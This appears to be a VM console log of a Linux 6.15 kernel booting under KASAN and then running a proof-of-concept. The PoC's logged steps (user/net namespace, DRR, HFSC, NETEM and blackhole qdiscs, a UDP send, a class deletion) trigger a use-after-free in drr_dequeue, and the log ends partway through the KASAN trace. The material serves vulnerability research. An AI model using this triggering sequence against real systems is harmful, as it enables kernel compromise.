bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+7EFCEF00+7EF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM...
c[?7l[2J[    0.000000] Linux version 6.15.0-rc6-00187-g407e0efdf8ba-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Tue May  5 16:33:23 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000007ffdffff] usable
[    0.000000] BIOS-e820: [mem 0x000000007ffe0000-0x000000007fffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] APIC: Static calls initialized
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] DMI: Memory slots populated: 1/1
[    0.000000] Hypervisor detected: KVM
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000000] kvm-clock: using sched offset of 396362877 cycles
[    0.000002] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.000004] tsc: Detected 3187.200 MHz processor
[    0.000312] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.000330] MTRR map: 4 entries (3 fixed + 1 variable; max 19), built from 8 variable MTRRs
[    0.000331] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.002391] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.002396] Using GB pages for direct mapping
[    0.002581] RAMDISK: [mem 0x7fe8f000-0x7ffdffff]
[    0.002585] ACPI: Early table checksum verification disabled
[    0.002586] ACPI: RSDP 0x00000000000F59D0 000014 (v00 BOCHS )
[    0.002590] ACPI: RSDT 0x000000007FFE1D68 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002594] ACPI: FACP 0x000000007FFE1BE4 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002598] ACPI: DSDT 0x000000007FFE0040 001BA4 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002600] ACPI: FACS 0x000000007FFE0000 000040
[    0.002602] ACPI: APIC 0x000000007FFE1C58 0000B0 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002604] ACPI: HPET 0x000000007FFE1D08 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002605] ACPI: WAET 0x000000007FFE1D40 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002607] ACPI: Reserving FACP table memory at [mem 0x7ffe1be4-0x7ffe1c57]
[    0.002607] ACPI: Reserving DSDT table memory at [mem 0x7ffe0040-0x7ffe1be3]
[    0.002608] ACPI: Reserving FACS table memory at [mem 0x7ffe0000-0x7ffe003f]
[    0.002609] ACPI: Reserving APIC table memory at [mem 0x7ffe1c58-0x7ffe1d07]
[    0.002609] ACPI: Reserving HPET table memory at [mem 0x7ffe1d08-0x7ffe1d3f]
[    0.002609] ACPI: Reserving WAET table memory at [mem 0x7ffe1d40-0x7ffe1d67]
[    0.002783] No NUMA configuration found
[    0.002783] Faking a node at [mem 0x0000000000000000-0x000000007ffdffff]
[    0.002785] NODE_DATA(0) allocated [mem 0x7fe8b800-0x7fe8efff]
[    0.002792] Zone ranges:
[    0.002792]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.002793]   DMA32    [mem 0x0000000001000000-0x000000007ffdffff]
[    0.002794]   Normal   empty
[    0.002795] Movable zone start for each node
[    0.002795] Early memory node ranges
[    0.002795]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.002796]   node   0: [mem 0x0000000000100000-0x000000007ffdffff]
[    0.002797] Initmem setup node 0 [mem 0x0000000000001000-0x000000007ffdffff]
[    0.004366] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.004402] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.027179] On node 0, zone DMA32: 32 pages in unavailable ranges
[    0.210970] kasan: KernelAddressSanitizer initialized
[    0.211165] ACPI: PM-Timer IO Port: 0x608
[    0.211176] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.211203] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.211205] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.211206] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.211207] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.211208] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.211209] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.211211] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.211211] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.211216] TSC deadline timer available
[    0.211219] CPU topo: Max. logical packages:   1
[    0.211219] CPU topo: Max. logical dies:       1
[    0.211220] CPU topo: Max. dies per package:   1
[    0.211222] CPU topo: Max. threads per core:   1
[    0.211223] CPU topo: Num. cores per package:     8
[    0.211223] CPU topo: Num. threads per package:   8
[    0.211224] CPU topo: Allowing 8 present CPUs plus 0 hotplug CPUs
[    0.211236] kvm-guest: APIC: eoi() replaced with kvm_guest_apic_eoi_write()
[    0.211250] kvm-guest: KVM setup pv remote TLB flush
[    0.211252] kvm-guest: setup PV sched yield
[    0.211257] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.211258] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x000fffff]
[    0.211260] [mem 0x80000000-0xfeffbfff] available for PCI devices
[    0.211261] Booting paravirtualized kernel on KVM
[    0.211262] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.219652] setup_percpu: NR_CPUS:64 nr_cpumask_bits:8 nr_cpu_ids:8 nr_node_ids:1
[    0.221285] percpu: Embedded 63 pages/cpu s220760 r8192 d29096 u262144
[    0.221318] Kernel command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.221354] random: crng init done
[    0.221355] printk: log buffer data + meta data: 262144 + 917504 = 1179648 bytes
[    0.222705] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.222780] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.222881] Fallback order for Node 0: 0 
[    0.222884] Built 1 zonelists, mobility grouping on.  Total pages: 524158
[    0.222885] Policy zone: DMA32
[    0.222887] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.222887] stackdepot: allocating hash table via alloc_large_system_hash
[    0.222888] stackdepot hash table entries: 1048576 (order: 12, 16777216 bytes, linear)
[    0.254922] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=8, Nodes=1
[    0.255934] Dynamic Preempt: voluntary
[    0.257048] rcu: Preemptible hierarchical RCU implementation.
[    0.257049] rcu: 	RCU event tracing is enabled.
[    0.257049] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=8.
[    0.257051] 	Trampoline variant of Tasks RCU enabled.
[    0.257052] 	Tracing variant of Tasks RCU enabled.
[    0.257052] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.257053] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=8
[    0.257073] RCU Tasks: Setting shift to 3 and lim to 1 rcu_task_cb_adjust=1 rcu_task_cpu_ids=8.
[    0.257076] RCU Tasks Trace: Setting shift to 3 and lim to 1 rcu_task_cb_adjust=1 rcu_task_cpu_ids=8.
[    0.265176] NR_IRQS: 4352, nr_irqs: 488, preallocated irqs: 16
[    0.265413] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.267685] Console: colour VGA+ 80x25
[    0.267716] printk: legacy console [ttyS0] enabled
[    0.306126] ACPI: Core revision 20240827
[    0.306467] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.307033] APIC: Switch to symmetric I/O mode setup
[    0.307422] x2apic enabled
[    0.307723] APIC: Switched APIC routing to: physical x2apic
[    0.308050] kvm-guest: APIC: send_IPI_mask() replaced with kvm_send_ipi_mask()
[    0.308459] kvm-guest: APIC: send_IPI_mask_allbutself() replaced with kvm_send_ipi_mask_allbutself()
[    0.308966] kvm-guest: setup PV IPIs
[    0.309792] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.310143] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.310731] Calibrating delay loop (skipped) preset value.. 6374.40 BogoMIPS (lpj=3187200)
[    0.311806] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    0.312218] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.312516] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.312735] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.313211] Spectre V2 : Spectre BHI mitigation: SW BHB clearing on syscall and VM exit
[    0.313729] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    0.314058] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    0.314730] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    0.315206] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    0.315683] MMIO Stale Data: Unknown: No mitigations
[    0.315730] ITS: Mitigation: Aligned branch/return thunks
[    0.316046] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.316729] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    0.317099] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    0.317466] x86/fpu: Supporting XSAVE feature 0x200: 'Protection Keys User registers'
[    0.317730] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.318086] x86/fpu: xstate_offset[9]:  832, xstate_sizes[9]:    8
[    0.318442] x86/fpu: Enabled xstate features 0x207, context size is 840 bytes, using 'compacted' format.
[    0.336802] Freeing SMP alternatives memory: 52K
[    0.337091] pid_max: default: 32768 minimum: 301
[    0.337402] LSM: initializing lsm=capability,selinux
[    0.337717] SELinux:  Initializing.
[    0.337865] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.338300] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.339138] smpboot: CPU0: Intel(R) Core(TM) i9-14900K (family: 0x6, model: 0xb7, stepping: 0x1)
[    0.339729] Performance Events: unsupported CPU family 6 model 183 no PMU driver, software events only.
[    0.339759] signal: max sigframe size: 3632
[    0.340037] rcu: Hierarchical SRCU implementation.
[    0.340316] rcu: 	Max phase no-delay instances is 400.
[    0.340671] Timer migration: 1 hierarchy levels; 8 children per group; 1 crossnode level
[    0.342821] smp: Bringing up secondary CPUs ...
[    0.343233] smpboot: x86: Booting SMP configuration:
[    0.343525] .... node  #0, CPUs:      #1 #2 #3 #4 #5 #6 #7
[    0.346789] smp: Brought up 1 node, 8 CPUs
[    0.347372] smpboot: Total of 8 processors activated (50995.20 BogoMIPS)
[    0.348065] Memory: 1665964K/2096632K available (51870K kernel code, 8748K rwdata, 11360K rodata, 6108K init, 1160K bss, 420188K reserved, 0K cma-reserved)
[    0.349784] devtmpfs: initialized
[    0.352764] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    0.353314] posixtimers hash table entries: 4096 (order: 4, 65536 bytes, linear)
[    0.353734] futex hash table entries: 2048 (order: 5, 131072 bytes, linear)
[    0.354266] PM: RTC time: 16:36:28, date: 2026-05-05
[    0.354759] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    0.355320] audit: initializing netlink subsys (disabled)
[    0.355665] audit: type=2000 audit(1777998989.425:1): state=initialized audit_enabled=0 res=1
[    0.355874] thermal_sys: Registered thermal governor 'step_wise'
[    0.356741] cpuidle: using governor menu
[    0.357597] PCI: Using configuration type 1 for base access
[    0.357784] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    0.358773] HugeTLB: allocation took 0ms with hugepage_allocation_threads=2
[    0.359145] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    0.359730] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    0.360211] ACPI: Added _OSI(Module Device)
[    0.360211] ACPI: Added _OSI(Processor Device)
[    0.360730] ACPI: Added _OSI(3.0 _SCP Extensions)
[    0.361005] ACPI: Added _OSI(Processor Aggregator Device)
[    0.367997] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    0.370019] ACPI: Interpreter enabled
[    0.370268] ACPI: PM: (supports S0 S3 S4 S5)
[    0.370518] ACPI: Using IOAPIC for interrupt routing
[    0.370755] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    0.371281] PCI: Using E820 reservations for host bridge windows
[    0.371995] ACPI: Enabled 2 GPEs in block 00 to 0F
[    0.386131] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    0.386510] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    0.386731] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    0.387347] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended configuration space under this bridge
[    0.387893] PCI host bridge to bus 0000:00
[    0.388156] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    0.388553] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    0.388731] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    0.389164] pci_bus 0000:00: root bus resource [mem 0x80000000-0xfebfffff window]
[    0.389604] pci_bus 0000:00: root bus resource [mem 0x100000000-0x17fffffff window]
[    0.389732] pci_bus 0000:00: root bus resource [bus 00-ff]
[    0.390083] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000 conventional PCI endpoint
[    0.394714] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100 conventional PCI endpoint
[    0.398799] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180 conventional PCI endpoint
[    0.399601] pci 0000:00:01.1: BAR 4 [io  0xc040-0xc04f]
[    0.399749] pci 0000:00:01.1: BAR 0 [io  0x01f0-0x01f7]: legacy IDE quirk
[    0.400142] pci 0000:00:01.1: BAR 1 [io  0x03f6]: legacy IDE quirk
[    0.400503] pci 0000:00:01.1: BAR 2 [io  0x0170-0x0177]: legacy IDE quirk
[    0.400730] pci 0000:00:01.1: BAR 3 [io  0x0376]: legacy IDE quirk
[    0.401254] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000 conventional PCI endpoint
[    0.401917] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    0.402349] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    0.402890] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000 conventional PCI endpoint
[    0.404002] pci 0000:00:02.0: BAR 0 [mem 0xfd000000-0xfdffffff pref]
[    0.404391] pci 0000:00:02.0: BAR 2 [mem 0xfebf0000-0xfebf0fff]
[    0.404747] pci 0000:00:02.0: ROM [mem 0xfebe0000-0xfebeffff pref]
[    0.405163] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    0.409645] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000 conventional PCI endpoint
[    0.410336] pci 0000:00:03.0: BAR 0 [mem 0xfebc0000-0xfebdffff]
[    0.410702] pci 0000:00:03.0: BAR 1 [io  0xc000-0xc03f]
[    0.410749] pci 0000:00:03.0: ROM [mem 0xfeb80000-0xfebbffff pref]
[    0.416065] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    0.416946] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    0.417664] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    0.418103] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    0.418596] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    0.420999] iommu: Default domain type: Translated
[    0.421282] iommu: DMA domain TLB invalidation policy: lazy mode
[    0.421818] SCSI subsystem initialized
[    0.422810] ACPI: bus type USB registered
[    0.423106] usbcore: registered new interface driver usbfs
[    0.423447] usbcore: registered new interface driver hub
[    0.423748] usbcore: registered new device driver usb
[    0.424086] pps_core: LinuxPPS API ver. 1 registered
[    0.424375] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    0.424737] PTP clock support registered
[    0.425011] Advanced Linux Sound Architecture Driver Initialized.
[    0.425894] NetLabel: Initializing
[    0.426095] NetLabel:  domain hash size = 128
[    0.426350] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    0.426715] NetLabel:  unlabeled traffic allowed by default
[    0.426770] PCI: Using ACPI for IRQ routing
[    0.427066] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    0.427092] pci 0000:00:02.0: vgaarb: bridge control possible
[    0.427426] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    0.427730] vgaarb: loaded
[    0.427950] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    0.428237] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    0.430801] clocksource: Switched to clocksource kvm-clock
[    0.431478] VFS: Disk quotas dquot_6.6.0
[    0.431678] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    0.434123] pnp: PnP ACPI init
[    0.435426] pnp: PnP ACPI: found 6 devices
[    0.444783] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    0.445437] NET: Registered PF_INET protocol family
[    0.445767] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    0.446647] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.447153] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    0.447619] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    0.448102] TCP bind hash table entries: 16384 (order: 7, 524288 bytes, linear)
[    0.448556] TCP: Hash tables configured (established 16384 bind 16384)
[    0.448997] UDP hash table entries: 1024 (order: 4, 65536 bytes, linear)
[    0.449403] UDP-Lite hash table entries: 1024 (order: 4, 65536 bytes, linear)
[    0.449902] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    0.450645] RPC: Registered named UNIX socket transport module.
[    0.450996] RPC: Registered udp transport module.
[    0.451270] RPC: Registered tcp transport module.
[    0.451547] RPC: Registered tcp-with-tls transport module.
[    0.451872] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    0.452774] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    0.453143] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    0.453511] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    0.453919] pci_bus 0000:00: resource 7 [mem 0x80000000-0xfebfffff window]
[    0.454319] pci_bus 0000:00: resource 8 [mem 0x100000000-0x17fffffff window]
[    0.454809] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    0.455154] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    0.455528] PCI: CLS 0 bytes, default 64
[    0.455822] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    0.455898] Unpacking initramfs...
[    0.456326] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.465214] Initialise system trusted keyrings
[    0.465634] workingset: timestamp_bits=56 max_order=19 bucket_order=0
[    0.466527] NFS: Registering the id_resolver key type
[    0.466835] Key type id_resolver registered
[    0.467087] Key type id_legacy registered
[    0.467388] 9p: Installing v9fs 9p2000 file system support
[    0.472033] Freeing initrd memory: 1348K
[    0.474303] Key type asymmetric registered
[    0.474557] Asymmetric key parser 'x509' registered
[    0.474883] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    0.475336] io scheduler mq-deadline registered
[    0.475604] io scheduler kyber registered
[    0.476194] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    0.476731] ACPI: button: Power Button [PWRF]
[    0.477931] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    0.478466] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    0.479711] Non-volatile memory driver v1.3
[    0.479961] Linux agpgart interface v0.103
[    0.480300] ACPI: bus type drm_connector registered
[    0.485675] loop: module loaded
[    0.487507] scsi host0: ata_piix
[    0.488094] scsi host1: ata_piix
[    0.488377] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14 lpm-pol 0
[    0.488820] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15 lpm-pol 0
[    0.489982] e100: Intel(R) PRO/100 Network Driver
[    0.490259] e100: Copyright(c) 1999-2006 Intel Corporation
[    0.490615] e1000: Intel(R) PRO/1000 Network Driver
[    0.490903] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    0.643820] ata2: found unknown device (class 0)
[    0.647467] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    0.648569] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    0.672654] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    0.673150] cdrom: Uniform CD-ROM driver Revision: 3.20
[    0.684507] sr 1:0:0:0: Attached scsi generic sg0 type 5
[    0.809907] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    1.094834] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    1.095230] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    1.095668] e1000e: Intel(R) PRO/1000 Network Driver
[    1.095964] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    1.096351] sky2: driver version 1.30
[    1.098161] usbcore: registered new interface driver usblp
[    1.098509] usbcore: registered new interface driver usb-storage
[    1.098914] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    1.099949] serio: i8042 KBD port at 0x60,0x64 irq 1
[    1.100245] serio: i8042 AUX port at 0x60,0x64 irq 12
[    1.100835] rtc_cmos 00:05: RTC can wake from S4
[    1.101540] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    1.102211] rtc_cmos 00:05: registered as rtc0
[    1.102628] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    1.103531] device-mapper: ioctl: 4.49.0-ioctl (2025-01-17) initialised: dm-devel@lists.linux.dev
[    1.104087] intel_pstate: CPU model not supported
[    1.104405] hid: raw HID events driver (C) Jiri Kosina
[    1.105572] usbcore: registered new interface driver usbhid
[    1.105898] usbhid: USB HID core driver
[    1.107728] netem: version 1.3
[    1.109506] Initializing XFRM netlink socket
[    1.109794] NET: Registered PF_INET6 protocol family
[    1.110591] Segment Routing with IPv6
[    1.110829] In-situ OAM (IOAM) with IPv6
[    1.111102] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    1.111684] NET: Registered PF_PACKET protocol family
[    1.112015] 9pnet: Installing 9P2000 support
[    1.112288] Key type dns_resolver registered
[    1.113306] IPI shorthand broadcast: enabled
[    1.124794] sched_clock: Marking stable (1082000913, 42310575)->(1134659615, -10348127)
[    1.125514] registered taskstats version 1
[    1.125767] Loading compiled-in X.509 certificates
[    1.133658] Demotion targets for Node 0: null
[    1.134066] PM:   Magic number: 10:646:640
[    1.134353] printk: legacy console [netcon0] enabled
[    1.134644] netconsole: network logging started
[    1.135002] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    1.135655] kworker/u32:1 (92) used greatest stack depth: 28888 bytes left
[    1.136033] Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    1.136520] Loaded X.509 cert 'wens: 61c038651aabdcf94bd0ac7ff06c7248db18c600'
[    1.136992] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    1.137499] cfg80211: failed to load regulatory.db
[    1.137801] ALSA device list:
[    1.137979]   No soundcards found.
[    1.139055] Freeing unused kernel image (initmem) memory: 6108K
[    1.139302] Write protecting the kernel read-only data: 65536k
[    1.139979] Freeing unused kernel image (text/rodata gap) memory: 1376K
[    1.140411] Freeing unused kernel image (rodata/data gap) memory: 928K
[    1.149182] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    1.149463] Run /init as init process
[    1.152133] mount (97) used greatest stack depth: 28216 bytes left

secb: rootfs ready
---- poc begin ----
poc: starting
poc: entered user+net namespace
poc: lo up
poc: added root DRR qdisc 1:
poc: added basic filter 1: -> 1:1
poc: added DRR class 1:1
poc: added HFSC qdisc 2:
poc: added HFSC class 2:1 (rt m1=8 d=1 m2=0)
poc: added NETEM qdisc 3:
poc: added BLACKHOLE qdisc 4:
[    1.164122] drr_dequeue: hfsc qdisc 2: is non-work-conserving?
poc: sent first UDP packet (seeds stale DRR active list)
poc: d[    1.164795] ==================================================================
eleted DRR class[    1.165338] BUG: KASAN: slab-use-after-free in drr_dequeue+0x89b/0xb80
 1:1
[    1.165837] Read of size 8 at addr ffff888007c7cc60 by task poc/103
[    1.166262] 
[    1.166370] CPU: 3 UID: 0 PID: 103 Comm: poc Not tainted 6.15.0-rc6-00187-g407e0efdf8ba-dirty #1 PREEMPT(voluntary) 
[    1.166374] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    1.166375] Call Trace:
[    1.166376]  <TASK>
[    1.166377]  dump_stack_lvl+0x53/0x70
[    1.166382]  print_report+0xce/0x670
[    1.166386]  ? drr_dequeue+0x89b/0xb80
[    1.166388]  kasan_report+0xce/0x100
[    1.166390]  ? drr_dequeue+0x89b/0xb80
[    1.166392]  drr_dequeue+0x89b/0xb80
[    1.166394]  __qdisc_run+0x16f/0x18f0
[    1.166398]  ? dev_qdisc_enqueue+0x3b/0x140
[    1.166401]  __dev_queue_xmit+0x13bd/0x3220
[    1.166404]  ? __alloc_skb+0x147/0x2d0
[    1.166407]  ? __pfx___alloc_skb+0x10/0x10
[    1.166409]  ? stack_depot_save_flags+0x29/0x800
[    1.166412]  ? __pfx___dev_queue_xmit+0x10/0x10
[    1.166414]  ? __pfx_selinux_ip_postroute_compat+0x10/0x10
[    1.166418]  ? _copy_from_iter+0x212/0x1130
[    1.166421]  ? unwind_next_frame+0x39d/0x2400
[    1.166425]  ? arch_stack_walk+0x73/0x100
[    1.166427]  ? selinux_ip_postroute+0x3fa/0xaf0
[    1.166429]  ip_finish_output2+0x71f/0x19a0
[    1.166433]  ? __pfx_ip_finish_output2+0x10/0x10
[    1.166435]  __ip_finish_output.part.0+0x474/0x950
[    1.166437]  ? __pfx___ip_finish_output.part.0+0x10/0x10
[    1.166440]  ? nf_hook_slow+0xa2/0x1c0
[    1.166442]  ip_output+0x25b/0x5d0
[    1.166445]  ? __ip_local_out+0x310/0x400
[    1.166447]  ? __pfx_ip_output+0x10/0x10
[    1.166449]  ? __pfx_ip_finish_output+0x10/0x10
[    1.166451]  ? __pfx_ip_generic_getfrag+0x10/0x10
[    1.166453]  ip_send_skb+0x116/0x150
[    1.166455]  udp_send_skb+0x656/0x1300
[    1.166459]  udp_sendmsg+0x11f3/0x1e40
[    1.166462]  ? __pfx_ip_generic_getfrag+0x10/0x10
[    1.166464]  ? __pfx_udp_sendmsg+0x10/0x10
[    1.166467]  ? up_read+0x1a/0xb0
[    1.166470]  ? __pfx_ldsem_down_read+0x10/0x10
[    1.166474]  ? __pfx_netlink_recvmsg+0x10/0x10
[    1.166476]  ? mutex_unlock+0x7d/0xd0
[    1.166479]  ? ldsem_up_read+0x12/0x40
[    1.166483]  __sys_sendto+0x35d/0x420
[    1.166487]  ? __pfx___sys_sendto+0x10/0x10
[    1.166490]  ? alloc_fd+0x336/0x5b0
[    1.166494]  ? ksys_write+0xf7/0x1c0
[    1.166496]  ? __pfx_ksys_write+0x10/0x10
[    1.166498]  __x64_sys_sendto+0xdb/0x1b0
[    1.166501]  ? clear_bhb_loop+0x40/0x90
[    1.166503]  ? clear_bhb_loop+0x40/0x90
[    1.166505]  ? clear_bhb_loop+0x40/0x90
[    1.166507]  do_syscall_64+0xa6/0x1b0
[    1.166510]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
